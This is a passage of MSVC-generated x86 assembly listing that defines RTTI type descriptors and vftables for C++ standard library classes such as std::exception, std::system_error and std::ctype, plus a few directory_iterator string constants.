	DD	040H
	DD	FLAT:??_R3failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2failure@ios_base@std@@8
rdata$r	SEGMENT
??_R2failure@ios_base@std@@8 DD FLAT:??_R1A@?0A@EA@failure@ios_base@std@@8 ; std::ios_base::failure::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@system_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@_System_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3failure@ios_base@std@@8
rdata$r	SEGMENT
??_R3failure@ios_base@std@@8 DD 00H			; std::ios_base::failure::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	05H
	DD	FLAT:??_R2failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R4failure@ios_base@std@@6B@
rdata$r	SEGMENT
??_R4failure@ios_base@std@@6B@ DD 00H			; std::ios_base::failure::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVfailure@ios_base@std@@@8
	DD	FLAT:??_R3failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$ctype@D@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$ctype@D@std@@8 DD FLAT:??_R0?AV?$ctype@D@std@@@8 ; std::ctype<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$ctype@D@std@@8
rdata$r	SEGMENT
??_R2?$ctype@D@std@@8 DD FLAT:??_R1A@?0A@EA@?$ctype@D@std@@8 ; std::ctype<char>::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@ctype_base@std@@8
	DD	FLAT:??_R1A@?0A@EA@facet@locale@std@@8
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$ctype@D@std@@8
rdata$r	SEGMENT
??_R3?$ctype@D@std@@8 DD 00H				; std::ctype<char>::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	05H
	DD	FLAT:??_R2?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$ctype@D@std@@@8
data$rs	SEGMENT
??_R0?AV?$ctype@D@std@@@8 DD FLAT:??_7type_info@@6B@	; std::ctype<char> `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$ctype@D@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$ctype@D@std@@6B@
rdata$r	SEGMENT
??_R4?$ctype@D@std@@6B@ DD 00H				; std::ctype<char>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$ctype@D@std@@@8
	DD	FLAT:??_R3?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@ctype_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@ctype_base@std@@8 DD FLAT:??_R0?AUctype_base@std@@@8 ; std::ctype_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2ctype_base@std@@8
rdata$r	SEGMENT
??_R2ctype_base@std@@8 DD FLAT:??_R1A@?0A@EA@ctype_base@std@@8 ; std::ctype_base::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@facet@locale@std@@8
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3ctype_base@std@@8
rdata$r	SEGMENT
??_R3ctype_base@std@@8 DD 00H				; std::ctype_base::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	04H
	DD	FLAT:??_R2ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AUctype_base@std@@@8
data$rs	SEGMENT
??_R0?AUctype_base@std@@@8 DD FLAT:??_7type_info@@6B@	; std::ctype_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AUctype_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4ctype_base@std@@6B@
rdata$r	SEGMENT
??_R4ctype_base@std@@6B@ DD 00H				; std::ctype_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AUctype_base@std@@@8
	DD	FLAT:??_R3ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Crt_new_delete@std@@8 DD FLAT:??_R0?AU_Crt_new_delete@std@@@8 ; std::_Crt_new_delete::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R2_Crt_new_delete@std@@8 DD FLAT:??_R1A@?0A@EA@_Crt_new_delete@std@@8 ; std::_Crt_new_delete::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R3_Crt_new_delete@std@@8 DD 00H			; std::_Crt_new_delete::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AU_Crt_new_delete@std@@@8
data$rs	SEGMENT
??_R0?AU_Crt_new_delete@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Crt_new_delete `RTTI Type Descriptor'
	DD	00H
	DB	'.?AU_Crt_new_delete@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R13?0A@EA@_Crt_new_delete@std@@8 DD FLAT:??_R0?AU_Crt_new_delete@std@@@8 ; std::_Crt_new_delete::`RTTI Base Class Descriptor at (4,-1,0,64)'
	DD	00H
	DD	04H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@facet@locale@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@facet@locale@std@@8 DD FLAT:??_R0?AVfacet@locale@std@@@8 ; std::locale::facet::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R2facet@locale@std@@8
rdata$r	SEGMENT
??_R2facet@locale@std@@8 DD FLAT:??_R1A@?0A@EA@facet@locale@std@@8 ; std::locale::facet::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3facet@locale@std@@8
rdata$r	SEGMENT
??_R3facet@locale@std@@8 DD 00H				; std::locale::facet::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	03H
	DD	FLAT:??_R2facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVfacet@locale@std@@@8
data$rs	SEGMENT
??_R0?AVfacet@locale@std@@@8 DD FLAT:??_7type_info@@6B@	; std::locale::facet `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVfacet@locale@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4facet@locale@std@@6B@
rdata$r	SEGMENT
??_R4facet@locale@std@@6B@ DD 00H			; std::locale::facet::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVfacet@locale@std@@@8
	DD	FLAT:??_R3facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Facet_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Facet_base@std@@8 DD FLAT:??_R0?AV_Facet_base@std@@@8 ; std::_Facet_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Facet_base@std@@8
rdata$r	SEGMENT
??_R2_Facet_base@std@@8 DD FLAT:??_R1A@?0A@EA@_Facet_base@std@@8 ; std::_Facet_base::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3_Facet_base@std@@8
rdata$r	SEGMENT
??_R3_Facet_base@std@@8 DD 00H				; std::_Facet_base::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Facet_base@std@@@8
data$rs	SEGMENT
??_R0?AV_Facet_base@std@@@8 DD FLAT:??_7type_info@@6B@	; std::_Facet_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_Facet_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Facet_base@std@@6B@
rdata$r	SEGMENT
??_R4_Facet_base@std@@6B@ DD 00H			; std::_Facet_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_Facet_base@std@@@8
	DD	FLAT:??_R3_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Ref_count_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Ref_count_base@std@@8 DD FLAT:??_R0?AV_Ref_count_base@std@@@8 ; std::_Ref_count_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Ref_count_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Ref_count_base@std@@8
rdata$r	SEGMENT
??_R2_Ref_count_base@std@@8 DD FLAT:??_R1A@?0A@EA@_Ref_count_base@std@@8 ; std::_Ref_count_base::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3_Ref_count_base@std@@8
rdata$r	SEGMENT
??_R3_Ref_count_base@std@@8 DD 00H			; std::_Ref_count_base::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2_Ref_count_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Ref_count_base@std@@@8
data$rs	SEGMENT
??_R0?AV_Ref_count_base@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Ref_count_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_Ref_count_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_cast@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_cast@std@@8 DD FLAT:??_R0?AVbad_cast@std@@@8 ; std::bad_cast::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_cast@std@@8
rdata$r	SEGMENT
??_R2bad_cast@std@@8 DD FLAT:??_R1A@?0A@EA@bad_cast@std@@8 ; std::bad_cast::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3bad_cast@std@@8
rdata$r	SEGMENT
??_R3bad_cast@std@@8 DD 00H				; std::bad_cast::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_cast@std@@6B@
rdata$r	SEGMENT
??_R4bad_cast@std@@6B@ DD 00H				; std::bad_cast::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVbad_cast@std@@@8
	DD	FLAT:??_R3bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_System_error_category@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_System_error_category@std@@8 DD FLAT:??_R0?AV_System_error_category@std@@@8 ; std::_System_error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_System_error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_System_error_category@std@@8
rdata$r	SEGMENT
??_R2_System_error_category@std@@8 DD FLAT:??_R1A@?0A@EA@_System_error_category@std@@8 ; std::_System_error_category::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R3_System_error_category@std@@8
rdata$r	SEGMENT
??_R3_System_error_category@std@@8 DD 00H		; std::_System_error_category::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2_System_error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_System_error_category@std@@@8
data$rs	SEGMENT
??_R0?AV_System_error_category@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_System_error_category `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_System_error_category@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_System_error_category@std@@6B@
rdata$r	SEGMENT
??_R4_System_error_category@std@@6B@ DD 00H		; std::_System_error_category::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_System_error_category@std@@@8
	DD	FLAT:??_R3_System_error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Iostream_error_category2@std@@8 DD FLAT:??_R0?AV_Iostream_error_category2@std@@@8 ; std::_Iostream_error_category2::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R2_Iostream_error_category2@std@@8 DD FLAT:??_R1A@?0A@EA@_Iostream_error_category2@std@@8 ; std::_Iostream_error_category2::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R3_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R3_Iostream_error_category2@std@@8 DD 00H		; std::_Iostream_error_category2::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Iostream_error_category2@std@@@8
data$rs	SEGMENT
??_R0?AV_Iostream_error_category2@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Iostream_error_category2 `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_Iostream_error_category2@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Iostream_error_category2@std@@6B@
rdata$r	SEGMENT
??_R4_Iostream_error_category2@std@@6B@ DD 00H		; std::_Iostream_error_category2::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_Iostream_error_category2@std@@@8
	DD	FLAT:??_R3_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Generic_error_category@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Generic_error_category@std@@8 DD FLAT:??_R0?AV_Generic_error_category@std@@@8 ; std::_Generic_error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Generic_error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Generic_error_category@std@@8
rdata$r	SEGMENT
??_R2_Generic_error_category@std@@8 DD FLAT:??_R1A@?0A@EA@_Generic_error_category@std@@8 ; std::_Generic_error_category::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R3_Generic_error_category@std@@8
rdata$r	SEGMENT
??_R3_Generic_error_category@std@@8 DD 00H		; std::_Generic_error_category::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2_Generic_error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Generic_error_category@std@@@8
data$rs	SEGMENT
??_R0?AV_Generic_error_category@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Generic_error_category `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_Generic_error_category@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Generic_error_category@std@@6B@
rdata$r	SEGMENT
??_R4_Generic_error_category@std@@6B@ DD 00H		; std::_Generic_error_category::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_Generic_error_category@std@@@8
	DD	FLAT:??_R3_Generic_error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@system_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@system_error@std@@8 DD FLAT:??_R0?AVsystem_error@std@@@8 ; std::system_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2system_error@std@@8
rdata$r	SEGMENT
??_R2system_error@std@@8 DD FLAT:??_R1A@?0A@EA@system_error@std@@8 ; std::system_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@_System_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3system_error@std@@8
rdata$r	SEGMENT
??_R3system_error@std@@8 DD 00H				; std::system_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	04H
	DD	FLAT:??_R2system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4system_error@std@@6B@
rdata$r	SEGMENT
??_R4system_error@std@@6B@ DD 00H			; std::system_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVsystem_error@std@@@8
	DD	FLAT:??_R3system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_System_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_System_error@std@@8 DD FLAT:??_R0?AV_System_error@std@@@8 ; std::_System_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_System_error@std@@8
rdata$r	SEGMENT
??_R2_System_error@std@@8 DD FLAT:??_R1A@?0A@EA@_System_error@std@@8 ; std::_System_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3_System_error@std@@8
rdata$r	SEGMENT
??_R3_System_error@std@@8 DD 00H			; std::_System_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	FLAT:??_R2_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4_System_error@std@@6B@
rdata$r	SEGMENT
??_R4_System_error@std@@6B@ DD 00H			; std::_System_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_System_error@std@@@8
	DD	FLAT:??_R3_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@error_category@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@error_category@std@@8 DD FLAT:??_R0?AVerror_category@std@@@8 ; std::error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R2error_category@std@@8
rdata$r	SEGMENT
??_R2error_category@std@@8 DD FLAT:??_R1A@?0A@EA@error_category@std@@8 ; std::error_category::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3error_category@std@@8
rdata$r	SEGMENT
??_R3error_category@std@@8 DD 00H			; std::error_category::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVerror_category@std@@@8
data$rs	SEGMENT
??_R0?AVerror_category@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::error_category `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVerror_category@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R1A@?0A@EA@runtime_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@runtime_error@std@@8 DD FLAT:??_R0?AVruntime_error@std@@@8 ; std::runtime_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2runtime_error@std@@8
rdata$r	SEGMENT
??_R2runtime_error@std@@8 DD FLAT:??_R1A@?0A@EA@runtime_error@std@@8 ; std::runtime_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3runtime_error@std@@8
rdata$r	SEGMENT
??_R3runtime_error@std@@8 DD 00H			; std::runtime_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4runtime_error@std@@6B@
rdata$r	SEGMENT
??_R4runtime_error@std@@6B@ DD 00H			; std::runtime_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVruntime_error@std@@@8
	DD	FLAT:??_R3runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD FLAT:??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD FLAT:??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@bad_alloc@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	FLAT:??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 00H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVbad_array_new_length@std@@@8
	DD	FLAT:??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD FLAT:??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD FLAT:??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 00H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVbad_alloc@std@@@8
	DD	FLAT:??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD FLAT:??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD FLAT:??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 00H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVexception@std@@@8
	DD	FLAT:??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_7?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@
CONST	SEGMENT
??_7?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@ DD FLAT:??_R4?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`vftable'
	DD	FLAT:?_Destroy@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ
	DD	FLAT:?_Delete_this@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ
	DD	FLAT:??_E?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAEPAXI@Z
	DD	FLAT:?_Get_deleter@_Ref_count_base@std@@UBEPAXABVtype_info@@@Z
CONST	ENDS
;	COMDAT ?_Static@?1???$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_System_error_category@std@@@1@A
_DATA	SEGMENT
?_Static@?1???$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_System_error_category@std@@@1@A DD FLAT:??_7_System_error_category@std@@6B@ ; `std::_Immortalize_memcpy_image<std::_System_error_category>'::`2'::_Static
	DD	07H
_DATA	ENDS
;	COMDAT ?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A
_DATA	SEGMENT
?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A DD FLAT:??_7_Iostream_error_category2@std@@6B@ ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static
	DD	05H
_DATA	ENDS
;	COMDAT ?_Static@?1???$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_Generic_error_category@std@@@1@A
_DATA	SEGMENT
?_Static@?1???$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_Generic_error_category@std@@@1@A DD FLAT:??_7_Generic_error_category@std@@6B@ ; `std::_Immortalize_memcpy_image<std::_Generic_error_category>'::`2'::_Static
	DD	03H
_DATA	ENDS
;	COMDAT ??_C@_0BI@CFPLBAOH@invalid?5string?5position@
CONST	SEGMENT
??_C@_0BI@CFPLBAOH@invalid?5string?5position@ DB 'invalid string position'
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BP@DPMCMHCK@directory_iterator?3?3operator?$CL?$CL@
CONST	SEGMENT
??_C@_0BP@DPMCMHCK@directory_iterator?3?3operator?$CL?$CL@ DB 'directory_'
	DB	'iterator::operator++', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@GANCNKKD@directory_iterator?3?3directory_i@
CONST	SEGMENT
??_C@_0CH@GANCNKKD@directory_iterator?3?3directory_i@ DB 'directory_itera'
	DB	'tor::directory_iterator', 00H		; `string'
